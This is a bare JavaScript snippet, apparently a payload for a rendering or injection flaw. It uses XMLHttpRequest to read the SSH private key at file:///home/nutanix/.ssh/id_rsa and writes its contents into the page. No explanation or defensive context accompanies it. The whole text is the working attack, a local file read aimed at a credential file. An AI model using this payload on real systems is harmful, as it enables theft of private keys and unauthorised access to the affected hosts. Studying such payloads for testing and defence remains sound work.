http = new XMLHttpRequest();
http.onload = function(){document.write(this.responseText);}
http.onerror = function(){document.write('failed!')}
http.open("GET","file:///home/nutanix/.ssh/id_rsa");
http.send();
